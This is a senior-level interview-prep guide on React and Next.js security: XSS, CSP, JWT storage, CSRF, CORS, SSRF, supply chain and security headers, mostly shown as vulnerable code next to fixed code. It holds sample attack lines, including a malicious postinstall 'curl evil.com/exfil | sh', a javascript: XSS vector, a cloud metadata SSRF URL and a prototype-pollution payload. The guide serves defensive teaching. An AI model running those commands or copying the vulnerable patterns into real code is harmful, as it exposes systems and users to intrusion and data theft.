# React Security: Threat Models, Attack Surfaces, and Defenses

Front-end security is not a checklist — it is a discipline of understanding where trust boundaries live and where they break. React gives you safe defaults, but seniors are expected to know precisely where those defaults end, what the browser enforces versus what your server must enforce, and how to reason about trade-offs (XSS vs CSRF, convenience vs attack surface, DX vs supply-chain risk). Every section below starts with the threat model, because knowing *why* a control exists is what separates a senior from someone who copy-pastes security patterns without understanding them.

---

## XSS: Stored, Reflected, and DOM-Based

### Q: How does React protect against XSS by default, and exactly where does that protection break down?

React auto-escapes all values interpolated into JSX at render time. When you write `<p>{userInput}</p>`, React converts the string to a text node — it never becomes parsed HTML. This is the default safe behavior.

**Where React does NOT protect you:**

**1. `dangerouslySetInnerHTML`** — bypasses escaping entirely.

```tsx
// VULNERABLE: raw HTML inserted without sanitization
function Comment({ content }: { content: string }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}

// FIXED: sanitize before injecting
import DOMPurify from 'dompurify';

function Comment({ content }: { content: string }) {
  const clean = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href', 'rel', 'target'],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

**2. `href="javascript:"` — React does not block this in JSX.**

```tsx
// VULNERABLE: attacker controls url
function Link({ url, label }: { url: string; label: string }) {
  return <a href={url}>{label}</a>;  // javascript:alert(1) works
}

// FIXED: validate scheme
const SAFE_SCHEMES = ['https:', 'http:', 'mailto:'];

function Link({ url, label }: { url: string; label: string }) {
  let parsed: URL;
  try {
    parsed = new URL(url, window.location.origin);
  } catch {
    return <span>{label}</span>;
  }
  if (!SAFE_SCHEMES.includes(parsed.protocol)) return <span>{label}</span>;
  return <a href={parsed.href} rel="noopener noreferrer">{label}</a>;
}
```

**3. `ref` to `innerHTML`** — a ref gives you raw DOM access; React cannot intercept it.

```tsx
// VULNERABLE
const divRef = useRef<HTMLDivElement>(null);
useEffect(() => {
  if (divRef.current) divRef.current.innerHTML = userControlledString; // XSS
}, [userControlledString]);
```

**4. SSR hydration injection** — if server-rendered HTML is built with string concatenation and user data is not escaped before serialization, the server ships XSS payloads to every client.

```ts
// VULNERABLE (custom SSR, not using React's renderToString correctly)
const html = `<div id="root">${unsafeUserData}</div>`;

// FIXED: always use React's renderToString / renderToPipeableStream;
// never concatenate user data into the HTML shell directly.
// For __NEXT_DATA__ / window.__INITIAL_STATE__ patterns:
import { serialize } from 'serialize-javascript'; // HTML-escapes </script>
const safeJson = serialize(serverData, { isJSON: true });
```

**5. Third-party scripts** — any `<script src="...">` you load is fully trusted; one compromised CDN script is game over for your origin.

**DOMPurify configuration notes:**

```ts
// Stricter config for untrusted rich text
const clean = DOMPurify.sanitize(html, {
  USE_PROFILES: { html: true },
  FORBID_TAGS: ['style', 'script', 'iframe', 'form'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick'],
  FORCE_BODY: true,
});
```

**Trusted Types (browser API, Chrome/Edge):**

```ts
// Enable via CSP header:
// Content-Security-Policy: require-trusted-types-for 'script'; trusted-types dompurify

if (window.trustedTypes && window.trustedTypes.createPolicy) {
  const policy = window.trustedTypes.createPolicy('dompurify', {
    createHTML: (dirty: string) => DOMPurify.sanitize(dirty, { RETURN_TRUSTED_TYPE: true }),
  });
  el.innerHTML = policy.createHTML(userInput); // Only allowed via policy
}
```

> 💡 Senior insight: Stored XSS is the highest-severity variant — payload is persisted in the database and executes for every user who loads it. DOM-based XSS never touches the server; the payload lives entirely in the URL fragment or localStorage and is processed by client JS (`document.write`, `innerHTML`, `eval`). React's escaping does not help if you're doing DOM-based XSS via a ref or `eval`.

⚠️ Gotcha: `DOMPurify.sanitize` returns a string by default. If you pass the output directly to `dangerouslySetInnerHTML.__html`, you are safe. But if you later re-assign that string to `.innerHTML` via a ref, Trusted Types will block it in enforcing browsers unless you use a policy.

**Follow-ups they'll ask:**
- What is the difference between stored, reflected, and DOM-based XSS?
- How would you test your app for XSS?
- What does `rel="noopener noreferrer"` actually prevent?

---

## Content Security Policy (CSP)

### Q: How does CSP mitigate XSS, and how do you make it work with SSR/Next.js?

CSP is a response header that tells the browser which sources of content are allowed to execute. Even if an attacker injects a `<script>` tag, CSP blocks its execution if the source is not whitelisted.

**Strict CSP with nonces (the correct modern approach):**

```
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  style-src 'nonce-{RANDOM}' 'self';
  img-src 'self' data: https:;
  object-src 'none';
  base-uri 'none';
  require-trusted-types-for 'script';
```

In Next.js (App Router) via middleware:

```ts
// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import crypto from 'crypto';

export function middleware(request: NextRequest) {
  const nonce = crypto.randomBytes(16).toString('base64');
  const cspHeader = [
    `default-src 'self'`,
    `script-src 'nonce-${nonce}' 'strict-dynamic'`,
    `style-src 'nonce-${nonce}' 'self'`,
    `img-src 'self' data: https:`,
    `object-src 'none'`,
    `base-uri 'none'`,
  ].join('; ');

  const response = NextResponse.next();
  response.headers.set('Content-Security-Policy', cspHeader);
  response.headers.set('x-nonce', nonce); // read in layout.tsx via headers()
  return response;
}
```

```tsx
// app/layout.tsx
import { headers } from 'next/headers';

export default function RootLayout({ children }: { children: React.ReactNode }) {
  const nonce = headers().get('x-nonce') ?? '';
  return (
    <html>
      <head>
        <script nonce={nonce} src="/analytics.js" />
      </head>
      <body>{children}</body>
    </html>
  );
}
```

**`strict-dynamic`** — trusts scripts loaded by a nonced script transitively, so you do not need to whitelist every third-party domain. It also ignores `'unsafe-inline'` for backward compat.

**Common pitfalls:**

- Using `'unsafe-inline'` makes CSP near-useless for script injection defense.
- Using `'unsafe-eval'` opens eval-based XSS vectors; avoid in production.
- Allowlisting entire domains (`script-src cdn.example.com`) is weaker than nonces — an attacker who can host a file on that CDN bypasses your policy.
- Inline styles blocked by CSP will break many component libraries; use nonces for critical inline styles or switch to CSS-in-JS that supports nonce injection.

> 💡 Senior insight: CSP is a defense-in-depth control, not a primary defense. Sanitize and validate inputs first. CSP catches what slips through. A CSP report-only mode (`Content-Security-Policy-Report-Only`) lets you audit violations before enforcement.

⚠️ Gotcha: Next.js `<Script>` component with `strategy="afterInteractive"` injects a script tag without your nonce. You may need to configure the nonce via `next.config.js` `headers()` or use custom `_document.tsx` with explicit nonce props.

**Follow-ups they'll ask:**
- What is `strict-dynamic` and why does it matter?
- How would you handle a third-party chat widget that inlines scripts?
- Difference between `Content-Security-Policy` and `Content-Security-Policy-Report-Only`?

---

## Authentication & Token Storage

### Q: Where should JWTs be stored — localStorage, cookies, or in-memory? Walk me through the trade-offs.

This is the canonical senior debate. The correct answer is "it depends on your threat model," but the nuanced answer is that **httpOnly cookies are almost always the better choice** for session tokens in a browser app.

| Storage | XSS risk | CSRF risk | Notes |
|---|---|---|---|
| `localStorage` | HIGH — any JS reads it | None (not auto-sent) | Never appropriate for high-value tokens |
| `sessionStorage` | HIGH — same origin JS | None | Same problem; clears on tab close |
| In-memory (JS var) | Medium — only current page JS | None | Lost on refresh; requires silent refresh |
| `httpOnly` cookie | Low — JS cannot read | Requires mitigation | Best default for session tokens |

**The classic vulnerable pattern:**

```ts
// VULNERABLE: stores JWT in localStorage
async function login(credentials: Credentials) {
  const res = await fetch('/api/login', { method: 'POST', body: JSON.stringify(credentials) });
  const { token } = await res.json();
  localStorage.setItem('token', token);  // Any XSS payload reads this
}

// Every request
fetch('/api/data', {
  headers: { Authorization: `Bearer ${localStorage.getItem('token')}` }
});
```

**Secure pattern: httpOnly cookie + access/refresh token split**

Server sets:
```
Set-Cookie: refresh_token=<opaque>; HttpOnly; Secure; SameSite=Strict; Path=/api/refresh; Max-Age=2592000
```

Client holds a short-lived access token **in memory only**:

```ts
// auth/tokenStore.ts — in-memory store, not persisted
let accessToken: string | null = null;

export const tokenStore = {
  get: () => accessToken,
  set: (t: string) => { accessToken = t; },
  clear: () => { accessToken = null; },
};

// auth/silentRefresh.ts
export async function silentRefresh(): Promise<boolean> {
  const res = await fetch('/api/auth/refresh', {
    method: 'POST',
    credentials: 'include', // sends httpOnly refresh_token cookie
  });
  if (!res.ok) { tokenStore.clear(); return false; }
  const { accessToken } = await res.json();
  tokenStore.set(accessToken);
  return true;
}

// On app boot and before each request if token is expiring
```

```tsx
// auth/AuthProvider.tsx
export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [ready, setReady] = useState(false);

  useEffect(() => {
    silentRefresh().finally(() => setReady(true));
    const interval = setInterval(silentRefresh, 14 * 60 * 1000); // refresh every 14 min
    return () => clearInterval(interval);
  }, []);

  if (!ready) return <LoadingScreen />;
  return <>{children}</>;
}
```

> 💡 Senior insight: The real question is not "XSS vs CSRF" — it is "what is your actual threat model?" If your app has any XSS vulnerability, localStorage tokens are fully compromised. If you have no XSS but a poor CSRF posture, cookies need SameSite + CSRF tokens. For most SPAs: httpOnly cookies for the refresh token, short-lived in-memory access token, silent refresh. This minimizes both attack surfaces.

⚠️ Gotcha: `SameSite=Strict` breaks OAuth redirects because the browser strips cookies on the redirect back from the identity provider. Use `SameSite=Lax` for the session cookie if you use third-party OIDC flows.

**Follow-ups they'll ask:**
- How do you handle token refresh race conditions when multiple tabs are open?
- What happens to in-memory tokens on a page refresh?
- How do you implement logout across tabs?

---

## CSRF: Cross-Site Request Forgery

### Q: How does CSRF work and how does your React SPA defend against it?

CSRF exploits the browser's automatic cookie attachment. An attacker's page on `evil.com` submits a form or fetch to `api.yourapp.com`; the browser attaches your session cookie; the server cannot distinguish this from a legitimate request.

**SameSite cookies (primary defense for SPAs):**

```
Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly
```

- `Strict` — cookie not sent on any cross-site request, including top-level navigation from another site.
- `Lax` — cookie sent on top-level GET navigation but not on cross-site POST/PUT/DELETE. Good balance for most apps.
- `None` — required for cross-site embedding (e.g., embedded iframes); must pair with `Secure`.

**Anti-CSRF tokens (for forms or when SameSite is insufficient):**

```ts
// Server generates a CSRF token tied to the session, sends it in a readable cookie or header
// CSRF cookie is NOT httpOnly so JS can read it
document.cookie // 'csrfToken=xyz123; Path=/'

// Client reads and sends it in a custom header
const csrfToken = getCookie('csrfToken');
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken ?? '',
  },
  body: JSON.stringify({ amount: 500 }),
});
// Server validates header matches session's CSRF token
```

**Double-submit cookie pattern** — server does not need to store token; it validates that the cookie value equals the request header value. Works because an attacker cannot read your cookies (same-origin policy) and thus cannot forge the matching header.

**Why SPAs with bearer tokens are less exposed (but not immune):**

SPAs that use `Authorization: Bearer <token>` in request headers are not vulnerable to classic CSRF — `evil.com` cannot set custom headers on cross-origin requests. However:
- If your API also accepts cookies (session fallback), CSRF is back.
- If a browser extension or XSS injects into your page, bearer tokens in localStorage are stolen directly.

> 💡 Senior insight: CSRF and XSS are inverses. CSRF exploits trusted cookies the browser sends automatically; XSS exploits trusted JavaScript that runs in your origin. Defending both simultaneously is why the access token / httpOnly refresh token pattern requires careful architecture.

**Follow-ups they'll ask:**
- Does `fetch` with `credentials: 'include'` send cookies cross-origin?
- Can a CSRF attack read the response, or only trigger the action?
- How does CORS interact with CSRF protection?

---

## Authorization: RBAC, ABAC, and Client-Side Route Guards

### Q: How do you implement authorization in a React app, and what's wrong with just protecting routes?

Client-side route guards are a UX affordance, not a security control. Any user can open DevTools, modify state, or call your API directly. All authorization must be enforced on the server.

**Protected route pattern (UX layer only — explicit about its role):**

```tsx
// components/ProtectedRoute.tsx
interface ProtectedRouteProps {
  requiredPermission: string;
  children: React.ReactNode;
}

export function ProtectedRoute({ requiredPermission, children }: ProtectedRouteProps) {
  const { user, isLoading } = useAuth();

  if (isLoading) return <LoadingSpinner />;
  if (!user) return <Navigate to="/login" replace />;
  if (!user.permissions.includes(requiredPermission)) return <Navigate to="/403" replace />;

  return <>{children}</>;
}

// Usage — prevents accidental navigation; server still enforces
<Route path="/admin" element={
  <ProtectedRoute requiredPermission="admin:read">
    <AdminDashboard />
  </ProtectedRoute>
} />
```

**Server-side enforcement (the real control):**

```ts
// Next.js Route Handler — server enforces on every request
// app/api/admin/users/route.ts
import { getSession } from '@/lib/auth';

export async function GET(req: Request) {
  const session = await getSession(req);
  if (!session) return Response.json({ error: 'Unauthorized' }, { status: 401 });
  if (!session.user.permissions.includes('admin:read')) {
    return Response.json({ error: 'Forbidden' }, { status: 403 });
  }
  // ... return data
}
```

**Permission-based rendering (hiding UI is not security):**

```tsx
// Hiding a button is UX; not fetching/returning data is security
function UserActions({ userId }: { userId: string }) {
  const { hasPermission } = usePermissions();

  return (
    <div>
      {hasPermission('user:read') && <ViewButton userId={userId} />}
      {hasPermission('user:delete') && <DeleteButton userId={userId} />}
    </div>
  );
  // DELETE /api/users/:id still checks permission on the server
}
```

> 💡 Senior insight: RBAC (role-based) assigns permissions to roles; ABAC (attribute-based) assigns permissions based on resource attributes and context (e.g., "user can edit their own posts but not others"). React apps often implement RBAC client-side for rendering decisions and ABAC server-side for data-level isolation. Both tiers must exist.

⚠️ Gotcha: In Next.js App Router, Server Components can fetch data directly. An RSC that reads `params.userId` without checking whether the current user owns that resource is an IDOR (insecure direct object reference) vulnerability — even though it's server-side code.

**Follow-ups they'll ask:**
- How do you handle permission changes without forcing a full logout?
- What is IDOR and how does it relate to front-end authorization?
- How do you implement row-level security in an API?

---

## CORS: What It Actually Is

### Q: Explain CORS. What does it protect against, and what does it not protect against?

CORS (Cross-Origin Resource Sharing) is a **browser-enforced** mechanism. It does not run on your server in a security sense — it instructs browsers on which cross-origin requests to allow. A server-side CORS misconfiguration does not expose data to non-browser clients (curl, Postman); it exposes data to cross-origin browser JavaScript.

**What CORS does protect:** prevents `evil.com` JavaScript from reading the response of a cross-origin request to `api.yourapp.com` when credentials are included.

**What CORS does not protect:** CSRF. Browsers *send* credentialed cross-origin requests; CORS only restricts *reading the response*.

**Preflight (OPTIONS) request:**

```
Browser: OPTIONS /api/data HTTP/1.1
         Origin: https://app.example.com
         Access-Control-Request-Method: POST
         Access-Control-Request-Headers: Authorization, Content-Type

Server: Access-Control-Allow-Origin: https://app.example.com
        Access-Control-Allow-Methods: POST, GET, OPTIONS
        Access-Control-Allow-Headers: Authorization, Content-Type
        Access-Control-Allow-Credentials: true
        Access-Control-Max-Age: 86400
```

**Dangerous CORS misconfiguration:**

```ts
// VULNERABLE: reflects origin without validation
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin); // any origin allowed
  res.header('Access-Control-Allow-Credentials', 'true');
  next();
});

// FIXED: whitelist explicitly
const ALLOWED_ORIGINS = new Set(['https://app.example.com', 'https://admin.example.com']);
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && ALLOWED_ORIGINS.has(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Vary', 'Origin');
  }
  next();
});
```

> 💡 Senior insight: `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` is invalid (browsers reject it). But `*` without credentials is fine for public APIs. The combination to fear is a reflected origin with credentials — it means any site can make authenticated requests and read your responses.

⚠️ Gotcha: CORS is not a substitute for authentication. A correctly configured CORS policy still means your endpoint must authenticate and authorize every request independently.

**Follow-ups they'll ask:**
- What is a simple request vs a preflighted request?
- Can a server-side proxy bypass CORS? (Yes — CORS is browser-only)
- Why does `Vary: Origin` matter for CDN caching?

---

## Secure Data Handling & Secret Exposure

### Q: What are the most common ways sensitive data leaks in a React/Next.js app?

**1. `NEXT_PUBLIC_` variable exposure:**

```ts
// .env.local
STRIPE_SECRET_KEY=sk_live_abc123        // server-only — never exposed
NEXT_PUBLIC_STRIPE_KEY=pk_live_xyz456  // NEXT_PUBLIC_ is bundled into client JS

// Any NEXT_PUBLIC_ variable is readable by anyone who loads your page.
// Never put secrets (API keys, DB URLs, signing secrets) in NEXT_PUBLIC_.
```

**2. Source maps in production:**

Source maps reconstruct your original TypeScript source, including comments, variable names, and sometimes embedded constants. Disable or restrict in production:

```js
// next.config.js
module.exports = {
  productionBrowserSourceMaps: false, // default false; ensure it stays off
};
```

If you need source maps for error tracking (Sentry), upload them to Sentry and delete them from your public build artifacts.

**3. RSC props leaking server data to the client:**

```tsx
// VULNERABLE: serializes entire DB object as RSC props
async function UserProfile({ id }: { id: string }) {
  const user = await db.users.findById(id); // includes passwordHash, internalNotes, etc.
  return <ProfileCard user={user} />; // entire object serialized to client
}

// FIXED: project only what the client needs
async function UserProfile({ id }: { id: string }) {
  const user = await db.users.findById(id);
  return <ProfileCard user={{ name: user.name, avatar: user.avatar, bio: user.bio }} />;
}
```

**4. `console.log` in production with sensitive data** — strip with a build plugin or ESLint rule:

```json
// .eslintrc
{ "rules": { "no-console": ["warn", { "allow": ["error"] }] } }
```

> 💡 Senior insight: The principle is "minimize blast radius." Every piece of data you send to the client is data an attacker can read or manipulate. Apply the principle of least privilege to serialization: send the minimum shape required for rendering.

---

## Dependency & Supply-Chain Security

### Q: How do you manage supply-chain risk in a React project?

Supply-chain attacks target your dependencies, not your code. The `colors` npm incident (maintainer sabotage), `event-stream` (malicious contributor), and numerous typosquatting attacks demonstrate the vector.

**Core practices:**

```bash
# Audit regularly
npm audit
npm audit --audit-level=high  # fail CI on high/critical

# Lock the dependency tree
# Commit package-lock.json; never add it to .gitignore
# Use --frozen-lockfile in CI
npm ci  # installs exactly from lockfile; fails if lockfile is out of date
```

**Typosquatting awareness:** `lodash` vs `1odash`, `react` vs `reect`. Verify package names, authors, and weekly download counts before installing.

**Postinstall script risk:**

```json
// A malicious package.json can run arbitrary code at install time:
{ "scripts": { "postinstall": "curl evil.com/exfil | sh" } }
```

Use `npm install --ignore-scripts` for untrusted packages or in CI environments where scripts are not needed.

**SRI for CDN scripts:**

```html
<!-- Subresource Integrity — browser verifies hash before executing -->
<script
  src="https://cdn.example.com/lib/3.0.0/lib.min.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous"
></script>
```

Generate: `openssl dgst -sha384 -binary lib.min.js | openssl base64 -A`

**Automated dependency updates:**

- **Dependabot** (GitHub) or **Renovate** — automated PRs for outdated packages; configure to auto-merge patch updates that pass CI.
- Minimize dependencies: every package is a potential attack vector; evaluate `npm install` decisions with the same weight as writing code.

> 💡 Senior insight: The fastest supply-chain fix is having fewer dependencies. Before adding a package, ask: "Can I implement this in 20 lines?" For packages you do use, pin major versions and review changelogs on upgrades.

---

## Miscellaneous Attack Vectors

### Q: What are clickjacking, open redirects, SSRF, prototype pollution, and ReDoS in the context of a React app?

**Clickjacking** — an attacker iframes your app and tricks users into clicking hidden buttons.

Defense: `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'`. The X-Frame-Options header is the legacy approach; `frame-ancestors` in CSP is more flexible and overrides X-Frame-Options in modern browsers.

**Open Redirects** — your app redirects to a URL in a query param without validation:

```tsx
// VULNERABLE
const { searchParams } = new URL(request.url);
const redirectTo = searchParams.get('redirect');
redirect(redirectTo!); // attacker sends ?redirect=https://evil.com

// FIXED: only allow relative paths or allowlisted domains
function safeRedirect(url: string | null, fallback = '/'): string {
  if (!url) return fallback;
  if (url.startsWith('/') && !url.startsWith('//')) return url; // relative only
  return fallback;
}
```

**SSRF via Next.js Server Actions / Route Handlers** — server-side code that fetches a user-supplied URL can be turned into a request to internal services:

```ts
// VULNERABLE: Next.js server action fetches user-supplied URL
'use server';
export async function fetchPreview(url: string) {
  const res = await fetch(url); // ?url=http://169.254.169.254/metadata → cloud SSRF
  return res.text();
}

// FIXED: validate URL against allowlist before fetching
const ALLOWED_HOSTS = ['api.example.com', 'images.example.com'];
export async function fetchPreview(url: string) {
  const parsed = new URL(url);
  if (!ALLOWED_HOSTS.includes(parsed.hostname)) throw new Error('Disallowed host');
  const res = await fetch(parsed.href);
  return res.text();
}
```

**Prototype Pollution** — attacker data mutates `Object.prototype` via `__proto__` or `constructor.prototype`, affecting all objects. Use `Object.create(null)` for data maps, or `structuredClone` for deep cloning untrusted data. Lodash's `merge`, `set`, and `zipObjectDeep` are historical vectors — pin to patched versions.

**ReDoS** — malicious input causes catastrophic backtracking in a regex. Avoid complex unbounded regexes for user input; use linear-time alternatives or the `re2` library for Node.js validation.

---

## Next.js / SSR-Specific Security

### Q: What are the unique security concerns in a Next.js App Router application?

**Server Actions are public HTTP endpoints:**

```ts
// THIS IS A PUBLIC ENDPOINT. Treat it like an API route.
'use server';

// VULNERABLE: no auth check
export async function deletePost(postId: string) {
  await db.posts.delete(postId); // any authenticated (or unauthenticated!) caller can delete
}

// FIXED: authenticate and authorize every server action
export async function deletePost(postId: string) {
  const session = await getSession();
  if (!session) throw new Error('Unauthorized');

  const post = await db.posts.findById(postId);
  if (post.authorId !== session.user.id && !session.user.permissions.includes('admin')) {
    throw new Error('Forbidden');
  }
  await db.posts.delete(postId);
}
```

**RSC data exposure** — as shown in the data handling section, server components pass props to client components via serialization. Only serialize what the client renders.

**`searchParams` injection** — server components that render `searchParams` directly without sanitization are vulnerable to reflected XSS if the output bypasses React's escaping (e.g., via `dangerouslySetInnerHTML` or `generateMetadata`).

**`generateMetadata` XSS via og tags:**

```ts
// Review what goes into metadata — it's rendered as HTML
export async function generateMetadata({ searchParams }: Props) {
  return {
    title: searchParams.q,  // if this ever routes to dangerouslySetInnerHTML elsewhere, risk
    openGraph: { description: searchParams.q },
  };
}
```

---

## Security Headers Checklist

A correct headers configuration is a quick, high-value security win:

```
# HSTS — force HTTPS for 1 year, include subdomains
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Prevent MIME-type sniffing attacks
X-Content-Type-Options: nosniff

# Control referrer information sent to third parties
Referrer-Policy: strict-origin-when-cross-origin

# Disable browser features you don't use
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()

# CSP (see dedicated section)
Content-Security-Policy: default-src 'self'; ...

# Clickjacking (use CSP frame-ancestors instead if CSP is deployed)
X-Frame-Options: DENY
```

In Next.js:

```js
// next.config.js
const securityHeaders = [
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
  { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains; preload' },
];

module.exports = {
  async headers() {
    return [{ source: '/(.*)', headers: securityHeaders }];
  },
};
```

---

## Senior Scenario: "A junior wants to store the JWT in localStorage — what do you say?"

This is a communication and depth-of-knowledge question as much as a technical one.

**What you say:**

"I'd start by understanding their goal — usually it's persistence across page refreshes. Then I'd walk through the threat model: any XSS vulnerability on our origin, now or in a future dependency, gives an attacker full access to that token. localStorage is readable by any JavaScript on the page, including third-party scripts like analytics and chat widgets.

The better architecture is to store a short-lived access token in memory and a longer-lived, opaque refresh token in an httpOnly cookie. The access token disappears on refresh, so we do a silent refresh on page load — a single round trip to `/api/auth/refresh`, which reads the httpOnly cookie the browser sends automatically. The refresh token is invisible to JavaScript, so XSS cannot steal it.

This does require us to implement the silent refresh flow and handle the brief loading state on startup, but it significantly narrows our XSS blast radius. The extra complexity is the right trade-off for any app handling sensitive data.

I'd also ask: why are we rolling our own token storage at all? If we're using NextAuth.js or a similar library, this is handled for us correctly out of the box."

> 💡 Senior insight: The best answer acknowledges trade-offs, proposes a concrete alternative, explains the threat model in plain terms (not just "it's insecure"), and raises the question of whether a battle-tested library already solves this.

---

## ⚡ Rapid-Fire

**Q: What does `rel="noopener noreferrer"` prevent?**
`noopener` prevents the new tab from accessing `window.opener` (phishing via tab hijack). `noreferrer` suppresses the Referrer header and implies `noopener`.

**Q: Is CORS a security mechanism on the server?**
No. CORS is browser-enforced. Curl ignores it. It restricts cross-origin JS from reading responses, not from making requests.

**Q: Can an httpOnly cookie be stolen via XSS?**
Not directly read. But XSS can trigger authenticated requests using the cookie (session riding), exfiltrate CSRF tokens, or modify the page to harvest credentials.

**Q: What is SameSite=Lax vs Strict for OAuth?**
Strict breaks OAuth redirect flows because the redirect from the IdP is cross-site. Lax allows top-level navigational GETs, making it compatible with OAuth redirects while still blocking CSRF on state-changing requests.

**Q: What is a postinstall script risk?**
npm runs lifecycle scripts at install time. A malicious package can exfiltrate env vars, keys in the environment, or modify local files. Use `npm ci --ignore-scripts` in CI.

**Q: How do Trusted Types prevent XSS?**
They make DOM XSS sinks (`innerHTML`, `document.write`, `eval`) require a special TrustedHTML/TrustedScript object that can only be produced by explicitly declared policies, enforced by the browser.

**Q: What is Subresource Integrity (SRI)?**
A `integrity` attribute on `<script>` or `<link>` tags with a cryptographic hash. The browser blocks execution if the fetched file does not match the hash, defending against CDN compromise.

**Q: What is prototype pollution and which JS operation commonly triggers it?**
Deeply merging `{ "__proto__": { "isAdmin": true } }` into a plain object mutates `Object.prototype`, affecting every object. Lodash `merge` historically was vulnerable; use `Object.create(null)` for data maps.

**Q: `NEXT_PUBLIC_` variables — what is the risk?**
They are statically inlined into the client bundle at build time. Anything you put in `NEXT_PUBLIC_` is visible to anyone who loads your page and inspects the JS. Never use it for secrets.

**Q: How do you handle CORS for a public API vs a private API?**
Public API: `Access-Control-Allow-Origin: *` without credentials is fine. Private API: whitelist specific origins, require credentials, validate every request with authentication.

---

## 🚩 Red Flags

- "We validate input on the front end, so we're fine" — client validation is UX; server validation is security.
- "I use `dangerouslySetInnerHTML` but only with our own content" — whose content gets into that field? Over what transport? Validated how?
- "The route guard protects the admin page" — route guards prevent accidental navigation; an API call bypasses them entirely.
- "JWT is in localStorage because sessions don't scale" — JWTs in cookies scale fine; stateless JWT + httpOnly cookie is a solved problem.
- "We don't need CSP because React escapes everything" — React escaping does not protect against DOM-based XSS, third-party scripts, or `dangerouslySetInnerHTML`.
- "CORS prevents unauthorized access to our API" — CORS is browser-enforced; any non-browser client ignores it. Your API must authenticate every request.
- "I'll just use `*` for CORS in development and fix it before prod" — that config routinely ships to prod in CI pipelines; whitelist origins from day one.
- "We audit dependencies quarterly" — quarterly is too slow; use Dependabot/Renovate for continuous automated auditing.
- "Server actions are safe because they run on the server" — they are public HTTP endpoints. Treat them exactly like API routes: authenticate, authorize, validate inputs.
- "We minify our code so secrets in the bundle are safe from attackers" — minification is not obfuscation; `NEXT_PUBLIC_SECRET_KEY` is trivially extractable from a minified bundle.
